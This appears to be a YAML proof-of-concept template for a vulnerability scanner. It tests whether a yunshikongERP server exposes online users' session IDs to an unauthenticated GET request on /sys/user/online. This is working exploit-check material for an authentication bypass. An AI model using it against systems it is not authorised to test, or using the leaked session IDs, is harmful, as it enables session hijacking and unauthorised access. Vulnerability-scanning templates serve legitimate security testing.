name: poc-yaml-yunshikongERP-user_online-Authentication-bypass
transport: http
  

rules:
  r0:
    request:
      method: GET
      path: /sys/user/online
      headers:
        User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)
    expression: response.status == 200 && response.body.bcontains(b'"sessionid":') && response.body.bcontains(b'"tomcat":')
expression: r0() 

